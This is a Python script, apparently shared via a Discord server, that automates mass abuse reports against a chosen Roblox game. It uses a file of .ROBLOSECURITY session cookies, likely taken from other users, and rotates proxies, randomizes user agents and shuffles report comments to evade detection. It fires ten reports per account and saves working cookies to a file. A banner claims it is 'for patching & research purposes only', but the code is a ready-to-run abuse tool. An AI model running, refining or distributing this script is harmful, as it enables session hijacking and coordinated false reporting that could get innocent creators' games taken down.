# discord.gg/removal protecting children!
import requests
import random
import os
import time
import re
import sys
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class UIColors:
    SUCCESS = '\033[92m'
    ERROR = '\033[91m'
    WARNING = '\033[93m'
    INFO = '\033[94m'
    HIGHLIGHT = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

BANNER = rf"""{UIColors.HIGHLIGHT}{UIColors.BOLD}
                                          
                                       ▄▄ 
                                       ██ 
████▄ ▄█▀█▄ ███▄███▄ ▄███▄ ██ ██  ▀▀█▄ ██ 
██ ▀▀ ██▄█▀ ██ ██ ██ ██ ██ ██▄██ ▄█▀██ ██ 
██    ▀█▄▄▄ ██ ██ ██ ▀███▀  ▀█▀  ▀█▄██ ██ 
                                          
                                       
Made by Rio ; discord.gg/removal
Published for patching & research purposes only.{UIColors.RESET}
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
]

ROBLOX_API_URL = "https://apis.roblox.com/abuse-reporting/v2/abuse-report"
save_lock = threading.Lock()

def load_data(file_path):
    if not os.path.exists(file_path):
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except Exception as e:
        print(f"{UIColors.ERROR}[!] Error loading {file_path}: {e}{UIColors.RESET}")
        return []

def persist_unlocked_cookie(cookie_value):
    with save_lock:
        with open("unlocked_cookies.txt", "a", encoding="utf-8") as f:
            f.write(f".ROBLOSECURITY={cookie_value}\n")

def encode_proxy_credentials(proxy_string):
    if not proxy_string or '@' not in proxy_string:
        return proxy_string
    try:
        auth_part, host_part = proxy_string.split('@')
        username, password = auth_part.split(':')
        encoded_user = urllib.parse.quote(username)
        encoded_pass = urllib.parse.quote(password)
        return f"{encoded_user}:{encoded_pass}@{host_part}"
    except ValueError:
        return proxy_string

def generate_natural_comment(base_text):
    prefixes = ["Hi, ", "Hello, ", "I noticed ", "I am reporting ", ""]
    words = base_text.split()
    if not words:
        return "Inappropriate content detected."
    random.shuffle(words)
    return f"{random.choice(prefixes)}{' '.join(words)}!"

def execute_report_cycle(cookie, proxies, target_id, base_comment):
    max_proxy_retries = 3 if proxies else 1
    
    for attempt in range(max_proxy_retries):
        session = requests.Session()
        current_proxy_label = "Local Connection"
        
        if proxies:
            raw_proxy = random.choice(proxies)
            formatted_proxy = encode_proxy_credentials(raw_proxy)
            session.proxies.update({"http": f"http://{formatted_proxy}", "https": f"http://{formatted_proxy}"})
            current_proxy_label = raw_proxy.split('@')[-1]
        
        try:
            auth_response = session.get("https://www.roblox.com/home", headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            if auth_response.status_code == 200:
                print(f"{UIColors.INFO}[*] Region Unlock Successful | {current_proxy_label}{UIColors.RESET}", flush=True)
                persist_unlocked_cookie(cookie)
            else:
                print(f"{UIColors.ERROR}[-] Authentication Failed (Status: {auth_response.status_code}) | {current_proxy_label}{UIColors.RESET}", flush=True)
                return

            csrf_response = session.post("https://auth.roblox.com/v2/logout", headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            csrf_token = csrf_response.headers.get("x-csrf-token")
            if not csrf_token:
                if proxies: continue
                return

            identity_response = session.get("https://users.roblox.com/v1/users/authenticated", headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            user_id = identity_response.json().get("id")
            if not user_id:
                if proxies: continue
                return

            headers = {
                "X-Csrf-Token": csrf_token, 
                "User-Agent": random.choice(USER_AGENTS), 
                "Cookie": f".ROBLOSECURITY={cookie}", 
                "Content-Type": "application/json;charset=UTF-8",
                "Origin": "https://www.roblox.com",
                "Referer": "https://www.roblox.com/"
            }

            for i in range(10):
                payload = {
                    "tags": {
                        "ENTRY_POINT": {"valueList": [{"data": "website"}]}, 
                        "REPORTED_ABUSE_CATEGORY": {"valueList": [{"data": "Inappropriate Content - Place, Image, Model"}]}, 
                        "REPORTED_ABUSE_VECTOR": {"valueList": [{"data": "place"}]}, 
                        "REPORTER_COMMENT": {"valueList": [{"data": generate_natural_comment(base_comment)}]}, 
                        "SUBMITTER_USER_ID": {"valueList": [{"data": str(user_id)}]}, 
                        "REPORT_TARGET_ASSET_ID": {"valueList": [{"data": target_id}]}
                    }
                }
                
                report_res = session.post(ROBLOX_API_URL, headers=headers, json=payload, timeout=10)
                
                if report_res.status_code in [200, 201]:
                    print(f"{UIColors.SUCCESS}[+] Reported {target_id} (UID: {user_id}) | Progress: {i+1}/10 | {current_proxy_label}{UIColors.RESET}", flush=True)
                else:
                    print(f"{UIColors.WARNING}[!] API Warning: {report_res.status_code} for UID: {user_id}{UIColors.RESET}", flush=True)
                    break
                time.sleep(0.2)
            return

        except Exception as e:
            if proxies and attempt < max_proxy_retries - 1:
                continue
            print(f"{UIColors.WARNING}[!] Connection Issue: {current_proxy_label} | {str(e)}{UIColors.RESET}", flush=True)
            return

def main():
    if os.name == 'nt':
        os.system('color')
        
    print(BANNER)
    
    cookies_list = load_data("cookies.txt")
    proxies_list = load_data("proxies.txt")
    comments_list = load_data("comment.txt")
    
    if not cookies_list:
        print(f"{UIColors.ERROR}[!] No session cookies found in cookies.txt.{UIColors.RESET}")
        return

    active_proxies = []
    if proxies_list:
        user_choice = input(f"{UIColors.WARNING}Proxies detected. Enable Proxy Mode? (y/n): {UIColors.RESET}").strip().lower()
        if user_choice == 'y':
            active_proxies = proxies_list
            print(f"{UIColors.INFO}[*] Proxy Mode: Enabled.{UIColors.RESET}")
        else:
            print(f"{UIColors.INFO}[*] Proxy Mode: Disabled (Local Connection).{UIColors.RESET}")
    else:
        print(f"{UIColors.INFO}[*] Running via Local Connection.{UIColors.RESET}")

    target_game_id = input(f"{UIColors.WARNING}Target Game ID > {UIColors.RESET}").strip()
    if not target_game_id:
        return

    valid_cookies = []
    for raw_c in cookies_list:
        match = re.search(r'\.ROBLOSECURITY=(_\|WARNING:[^;]+)', raw_c)
        if match:
            valid_cookies.append(match.group(1))
        elif "_|WARNING:" in raw_c:
            valid_cookies.append(raw_c)

    print(f"{UIColors.HIGHLIGHT}[*] Initializing {len(valid_cookies)} worker threads...{UIColors.RESET}\n", flush=True)
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        task_futures = [
            executor.submit(
                execute_report_cycle, 
                cookie, 
                active_proxies, 
                target_game_id, 
                random.choice(comments_list) if comments_list else "Inappropriate content."
            ) for cookie in valid_cookies
        ]
        for _ in as_completed(task_futures):
            pass

    print(f"\n{UIColors.SUCCESS}{UIColors.BOLD}[+] Task Execution Complete. Unlocked cookies saved to 'unlocked_cookies.txt'{UIColors.RESET}", flush=True)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{UIColors.ERROR}[!] Process terminated by user.{UIColors.RESET}")
        sys.exit()
